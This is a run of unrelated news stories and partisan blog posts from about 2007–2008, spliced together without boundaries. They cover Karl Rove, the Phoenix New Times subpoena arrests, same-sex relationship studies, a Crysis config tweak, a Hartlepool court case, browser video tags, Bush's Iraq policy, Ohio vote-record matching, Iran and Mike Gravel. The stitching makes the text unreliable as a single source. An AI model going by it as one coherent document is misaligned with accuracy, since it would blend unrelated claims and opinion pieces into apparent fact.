While delivering a speech to the Bay Area Citizens Against Lawsuit Abuse , former Bush Administration political strategist Karl Rove was asked about recent charges from former White House Press Secretary Scott McClellan that Rove , along with the President , Vice President and former chiefs of staff I. Lewis " Scooter " Libby and Andrew Card , deliberately gave him false information related to the outing of CIA operative Valerie Plame to relay to the public .
Responds Rove : " He sent me a couple e-mails saying that -- saying that this had gotten all carried out of proportion and -- that he was surprised that they 'd done it and -- said that he'd give me a fair explanation in the thing , and he 's a friend , and I 'm - - he 's a good guy , and we 'll see what the book actually says ... "
Video of the response , as broadcast on KIII - TV News on November 29 , 2007 , can be viewed below .
PHOENIX - Two newspaper executives who published details of a secret grand jury subpoena seeking reporters ' notes and lists of website readers wo n't face charges following a deluge of criticism about their arrests , the county attorney announced yesterday .
" It has become clear to me that the matter has gone in a direction that I would not have authorized , " Maricopa Attorney Andrew Thomas said .
" The case can not go forward .
It has been compromised . "
But he said he still believes the Phoenix New Times " arguably " broke the law when on Thursday it published details from the Aug. 24 subpoena , which stems from the investigation into an article the paper published that included the home address of Sheriff Joe Arpaio .
State law prohibits online publication of law enforcement members ' home addresses " if the disclosure poses an imminent and serious threat " to the safety of officers or their families .
But the subpoena went far beyond the 2004 article , seeking documents and other material related to the preparation and publication of numerous stories on Arpaio .
It also sought Internet addresses of all people who visited the New Times website and any Internet addresses those people may have gone to before reading the stories .
The paper 's executives , Michael Lacey and Jim Larkin , wrote that they regarded the article published Thursday as an act of civil disobedience , and called the subpoena a " breathtaking abuse of the United States Constitution . "
Lacey , executive editor of Village Voice Media , and Larkin , chief executive of the Phoenix - based chain , were arrested on a misdemeanor charge of disclosing grand jury information .
Disclosing grand jury information is punishable by up to six months in jail and $ 2,500 in fines for a person , $ 20,000 for an enterprise .
Lacey , who said he was held in custody for seven hours before being released yesterday , welcomed Thomas 's decision to drop the case .
" It certainly took some courage for him to do that , " Lacey said .
" It is great news for the First Amendment and the Constitution and our readers . "
Special prosecutor Dennis Wilenchik , who had issued the subpoenas , did not immediately return calls for comment Friday .
First Amendment advocates , journalist groups , and the libertarian - oriented Goldwater Institute blasted the prosecutor for the arrests and the subpoena .
" It is stunningly overbroad , " said David Bodney , a First Amendment lawyer who represents media clients .
" This in some ways strikes at the heart of a free press and creates what we call a chilling effect , " said Joseph A. Russomanno , an associate professor of journalism at Arizona State University who co-wrote a recently published text on journalism law .
Clint Bolick , a civil liberties advocate with the Goldwater Institute , said he stood shoulder to shoulder with the journalism executives .
" It is difficult to conceive any wrong that could justify such a sweeping inquiry , not only into the files of New Times but into the Internet browsing habits of tens of thousands of innocent readers , " Bolick wrote in an e-mail .

TUESDAY , Jan. 22 , 2008 ( HealthDay News ) --
Same - sex couples are as committed and happy in their romantic relationships as heterosexual couples , find two studies in the January issue of the journal Developmental Psychology .
The authors of the studies say their findings challenge the stereotype that same - sex relationships are n't as healthy or secure as heterosexual pairings .
In the first study , researchers at the University of Urbana - Champaign compared 30 committed gay male and 30 committed lesbian couples to 50 engaged and 40 older married heterosexual couples , as well as dating heterosexual couples .
The researchers found that all the couples had positive views of their relationships , but the more committed couples ( gay or straight ) resolved conflict better than the heterosexual dating couples .
The belief that committed same - sex relationships are " atypical , psychologically immature , or malevolent contexts of development was not supported by our findings , " noted lead author Glenn I. Roisman .
" Compared with married individuals , committed gay males and lesbians were not less satisfied with their relationships . "
Roisman added that gay males and lesbians " were generally not different from their committed heterosexual counterparts on how well they interacted with one another , although some evidence emerged the lesbian couples were especially effective at resolving conflict . "
The second study -- conducted by researchers from the University of Washington , San Diego State University and the University of Vermont -- examined how sexual orientation and legal status affected relationship quality among 65 gay male and 138 lesbian couples in civil unions , 23 gay male and 61 lesbian couples not in civil unions , and 55 married heterosexual couples .
The three - year study found that same - sex couples were similar to heterosexual couples in most relationship areas and that legal status did n't seem to be the overriding factor affecting same - sex relationships .
Regardless of civil union status , same - sex couples were more satisfied with their relationships , reported more positive feelings toward their partners , and reported less conflict than married heterosexual couples .
The researchers did find that same - sex couples not in civil unions were more likely to end their relationships than same - sex couples in civil unions or married heterosexual couples .
This suggests that protections offered by a legalized relationship may have an impact on same - sex couples , said the researchers , who plan to examine that question in future research .

Spend enough time reading or writing gaming news and you 'll quickly learn that PC gamers on the Internet have an irrepressible capacity to dig through , tweak , and just outright hack every nook and cranny of popular video games .
While most of us scratch our heads and wonder why DirectX 10 is still exclusive to Vista — one industrious soul has found a way to enable DirectX 10 features and quality settings in the Crysis demo on Windows XP .
We have seen Vista - only games made to run under XP before but I 've never seen anything like this enabled so easily .
If you tweak the configuration files in CVarGroups by copying and pasting the " very high " settings ( 1st paragraph ) IN PLACE of the " high " settings ( last paragraph ) the game will load the highest possible settings even though the drop - down menus display " high . "
Note to Microsoft and Crytek :
When gamers find out that all that stands between them and DirectX 10 quality gaming on XP is a simple modification to a config file , your whole " Vista can do gaming things that XP can 't " line sounds pretty manufactured — please stop jerking us around , kthx .
There is pretty much zero danger with this mod so I recommend you give it a try .
Just make back up copies of any config files you plan to edit .
If you get this working , be sure to let us know in the comments !
The attack took place on Hartlepool 's Jobson Street in July
The 27 - year - old shouted " this is YouTube material " as he degraded Christine Lakinski , 50 , who had fallen ill , magistrates heard .
Miss Lakinski , who suffered a number of medical conditions , died from natural causes , an inquest found .
Anthony Anderson , of Raby Road , who admitted outraging public decency , will be sentenced at Teesside Crown Court .
Hartlepool magistrates heard how , on 27 July , Miss Lakinski was making her way home with a box of laminate flooring when she fell ill and stumbled into a doorway .
Although his actions did not contribute to her death it was appalling behaviour that robbed her of any dignity in the last hours of her life
Lynne Dalton , prosecuting
Anderson had smoked a cannabis joint and been drinking when he and two friends spotted her .
He tried to rouse her by throwing a bucket of water over her , before urinating on her and covering her with shaving foam .
The incident was filmed on a mobile phone .
She was later declared dead at the scene , the cause of death being given as pancreatic failure .
Lynne Dalton , prosecuting , said : " Although his actions did not contribute to her death it was appalling behaviour that robbed her of any dignity in the last hours of her life . "
She urged magistrates to transfer the case to crown court for sentencing , claiming their maximum powers were insufficient .
Anderson 's solicitor did not oppose the application and his client will be sentenced at Teesside Crown Court on 22 October .
After Wednesday 's hearing , Miss Lakinski's brother , Mark , said : " We will await the outcome and just hope he gets what he deserves . "
New features in the Firefox and Opera browsers could make it less complex and cheaper for people to incorporate video into their Web sites , representatives of Mozilla and Opera say .
Firefox and Opera will support a new HTML tag specifically for embedding video in Web pages .
As long as the browsers support a video 's specific codec , or encoding method , the browsers will then be able to play the video without launching third - party enabling software , said Chris Double , a Mozilla engineer .
Mozilla and Opera are also working to support the royalty - free video codec Ogg Theora .
Video on the Web is a fractured mix of proprietary formats , encoded using systems from four main vendors .
Apple offers QuickTime , Microsoft offers Windows Media , Adobe offers Flash and RealNetworks has RealPlayer .
A user must have a plug - in from each of those vendors if they want to play video in that vendor 's format .
The plug-ins that play video are free to download and use :
The software companies make their money selling encoders to create the video , and server software to host and stream video .
What 's Easier in the Plan ?
Opera and Mozilla officials say the changes to their browsers will offer a new level of ease for Web developers using open - source tools to embed and stream their video .
If video encoded in Ogg Theora plays directly in the browser , everyday Internet surfers would not have the burden of downloading extra plug-ins for their browser to play the video .
Developers would not have to pay royalties to use the Ogg Theora codec , and open - source streaming media servers such as VLC or Icecast are free .
" With a baseline , royalty - free codec , end - users can produce and embed their own videos without having to pay any fees for the production of the video itself or the rights to stream it , " Double said .
That could prove challenging to big vendors such as Adobe and Microsoft , who are betting big on demand for their own video and multimedia tools to feed the Internet 's video boom .
Adobe recently rolled out an upgrade to its software , Flash 9 , used by sites such as Google 's YouTube .
Microsoft also recently released its Silverlight multimedia technology , designed to build dynamic videos and graphics .
Supporters of the video tag and royalty - free codec contend it 's vexing to have private software companies control video formats .
Those vendors , for example , could suddenly change their long - term support plans depending on changes in their business or simply halt support for certain operating systems , such as Linux .
A Video HTML Tag
The challenge , however , will be getting all browser makers to support a video HTML tag and one or a set of the same encoding codecs .
On the photo side , this already works :
All browsers support the " img " HTML tag and JPEG and PNG file formats , which do n't require extra software to view .
" You do n't require a plug - in to view images , " said Mike Schroepfer , vice president of engineering for Mozilla .
" I think video is the next natural evolution of that . "
HTML , the Web 's mother tongue , never included a video tag in its original specifications .
Videos encoded in Flash , for example , are often launched via JavaScript code , which Double argues can be difficult for people to manipulate on their own Web pages .
The World Wide Web Consortium ( W3C ) , the caretaker of HTML , is working on a long - term project to update and add new features to the HTML specifications used by Web browsers .
A video HTML tag is under consideration .
However , a final specification for HTML 5 could be a decade away , the editor of the committee developing it said .
The success of the video tag will largely depend on if browser makers start supporting it and Web developers embrace it .
" It 's not only about specifications , " said Karl Dubost , conformance manager for the W3C .
" It [ the video HTML tag ] requires deployment in enough browsers so that the market forces make it ubiquitous across platforms . "
Mozilla and Opera are pressing ahead without waiting for an update to the HTML standard .
The video tag feature wo n't make it in the initial Firefox 3.0 release , scheduled for next year , but will be delivered in future updates , Double said .
Early last month , Opera released an experimental build of its browser with support for a video tag as well as support for Ogg Theora .
Microsoft 's Internet Explorer holds about 80 percent of the browser market , and it remains to be seen how it views Opera 's and Mozilla 's plans .
Microsoft did not response to requests for comment .
Microsoft tends to not go along with other vendors ' standardization efforts , said Dimitris Dimitriadis , who consults companies on standards implementation and formerly worked with the W3C .
But if a technology or specification starts to be widely used , Microsoft has been known to change course .
" I think they are very sensitive to market changes , " Dimitriadis said .
" If they see that people want to use embedded video they will certainly provide an alternative . "
But other problems could arise if Opera 's and Mozilla 's implementations of a video HTML tag do n't match a future W3C specification , Dimitriadis said .
The process of creating a standard is very slow , and it's inevitable that companies ' technology will move much faster than the administrative process , he said .
" There 's a risk of having brilliant people spending time on something that does not get implemented , " Dimitriadis said .
Apparently , Bush has a plan to take away the Democratic frontrunners ' plans to use Iraq as a campaign issue .
Of course , the Republican candidates are entirely unaffected -- seeing as they want to stay away from Iraq as much as possible -- but Bush 's actions are non-political , make no mistake about that .
( A) s Bush rallied U.S. troops at the base here on Saturday with a " Hoo-ah " and conferred with his Iraq dream team , Gen. David Petraeus and Ambassador Ryan Crocker , he indicated that he was setting in motion policies that could dramatically affect the presidential race -- and any decisions the next president makes in 2009 .
In remarks to the traveling press , delivered from the Third Army operation command center here , Bush said that negotiations were about to begin on a long - term strategic partnership with the Iraqi government modeled on the accords the United States has with Kuwait and many other countries .
Crocker , who flew in from Baghdad with Petraeus to meet with the president , elaborated : " We 're putting our team together now , making preparations in Washington , " he told reporters .
" The Iraqis are doing the same .
And in the few weeks ahead , we would expect to get together to start this negotiating process . "
The target date for concluding the agreement is July , says Gen. Doug Lute , Bush 's Iraq coordinator in the White House -- in other words , just in time for the Democratic and Republican national conventions .
Most significant of all , the new partnership deal with Iraq , including a status of forces agreement that would then replace the existing Security Council mandate authorizing the presence of the U.S. - led multinational forces in Iraq , will become a sworn obligation for the next president .
It will become just another piece of the complex global security framework involving a hundred or so countries with which Washington now has bilateral defense or security cooperation agreements .
Last month , Sen. Hillary Clinton urged Bush not to commit to any such agreement without congressional approval .
The president said nothing about that on Saturday , but Lute said last fall that the Iraqi agreement would not likely rise to the level of a formal treaty requiring Senate ratification .
Even so , it would be difficult if not impossible for future presidents to unilaterally breach such a pact .
As far as the number of U.S. troops that would remain in Iraq under such a pact , the administration is considering changes that could also pre-empt anything the Democrats have in mind .[..]
In fact , one Pentagon contractor who is working on the long - term U.S. plans for Iraq says that the administration is considering new configurations of forces that could reduce troop levels to well under 100,000 , perhaps to as few as 60,000 , by the time the next president takes office .
The upshot is that the next president , Democrat or Republican , is likely to be handed a fait accompli that could well render moot his or her own elaborate withdrawal plans , especially the ones being considered by the two leading Democratic contenders .
Uh-oh :
Ohio law permits anyone to walk into a county election office and obtain two crucial documents : a list of voters in the order they voted , and a time - stamped list of the actual votes .
“ We simply take the two pieces of paper together , merge them , and then we have which voter voted and in which way , ” said James Moyer , a longtime privacy activist and poll worker who lives in Columbus , Ohio .

President Bush , a lame - duck loose cannon , is traipsing around the Middle East calling Iran a state sponsor of terror and condemning what he calls Iran ’s “ provocative ” acts in the Strait of Hormuz at the choke point between the Persian Gulf and the Arabian Sea .
Everyone knows the president and his viceroy , Vice President Dick Cheney , are just itching to launch American bombers and cruise missiles against Iran before the end of this second nightmarish term of office , and now we hear that the so - called “ provocative ” incident , which we were told was replete with threats to blow up a destroyer in “ 15 seconds ” was actually the work of a “ prankster ” who was making threats on the air using English with a faked ( badly ) Iranian accent .
So has this brush with disaster , which would have surely ensued had the US Navy fired on Iranian speedboats in their vicinity , led the president to pull back from his bellicosity ?

Mike Gravel : I love my country , and I love the human race

With Washington and the mainstream media all abuzz with Congressman Ron Paul raising a little over $ 5 million dollars in the fourth quarter , which is a little under what Senator John McCain raised , I do feel there is meat within what the lower - tier candidates are saying .
In raising this amount , the MSM is somehow forced to recon with this and give candidates like Paul more air time and that is a good thing for the American electorate .
Through both the Democratic and Republican debates more time is focused on the top - tier candidates in which the time given them to answer any number of questions is boiled down to one minute or thirty second sound bites .
What substantive value can be gained within those time - slots ?
Not much if you ask me .
I am not one of those people that approves of kicking any one candidate off of these debates .
To me , it goes against what democracy truly means .
Democracy to me means hearing from all voices and not just some .
If anything , these debates would serve ‘ we the people ’ better if they gave the lower - tier candidates more time .
Who knows it can change the course of our shared destiny .
Thankfully through the Internet any void left by the mainstream media and these debates is being filled by this medium .
The Internet is the very tool that did help Ron Paul raise those funds .
I have advocated in the past for all voters to do their own research and stop relying on what is being reported by the mainstream media .
Through sites such as YouTube.com , the candidate ’s own websites and others , you can clearly hear what the candidate stands for without them being interrupted or some pundit editorializing what they are relaying .
Some can even be downright rude and that is uncalled for .
We the people are owed more than that .
Last night on one political Yahoo group , a list member posted an interview in which Ray Suarez interviewed former Senator , Mike Gravel .
The site that affords Gravel a podium is called Information Clearing House and they titled it , “ I ’m ashamed of this ”
This interview lasts approximately 17 minutes .
Most likely that time allotted for this interview far exceeded what Gravel was given in all of the debates combined .
Through this interview , you could see a relaxed , Mike Gravel .
Some have called him excitable , but that stands to reason when he is not able to get his message across through these past debates .
In fact as I listened to this interview , I felt relaxed and was able to really hear what he had to offer ‘ we the people ’ and I did like what I was hearing .
From the beginning of this campaign cycle , I have been thirsting and craving for new ideas .
What I have been seeking is for a candidate to both stimulate me and excite me and I have not been getting that from the top - tier candidates of either party .
Candidates such as Paul and Gravel are barely a blip on any major poll taken , but I do feel that if more became acquainted with their ideas in which voters could hear what they have to add , an upset could occur .
In fact , I am hoping it does .
Through such interviews and messages getting out via the Internet , those that control the message would find themselves scratching their heads .
Who is to say if voters in Iowa and New Hampshire are tending to lean towards the top - tier candidates ?
Americans for the most part like to comparison shop and perhaps through presentations such as Gravel ’s and Paul ’s , it may seal the deal .
Through this piece , I have chosen not to opine on the answers given by former Senator , Mike Gravel , but allow for his words to stand as is .
But , I did come away feeling , he has something .
He gets it .
I came away only to say , “ YES ! ” , finally someone is telling it like it is .
I am not one to gush , but in this case I did so .
If you are a Democrat charged with helping to select who represents your party going into this race , please take time , sit down and really listen to what Gravel has to say .
Please look around at what has transpired in these past seven years and see he does offer alternatives .
You owe it to yourselves and more importantly , the American electorate .
Back in January of 2006 , I wrote a piece for LiberalPatriot.org , We Deserve More Than the Lesser of Who Cares .
I do feel many are craving for a candidate who gives us something to care for .
In this article , I did quote former Vice President Al Gore when he said in the third presidential debate in 2000 these inspirational words :
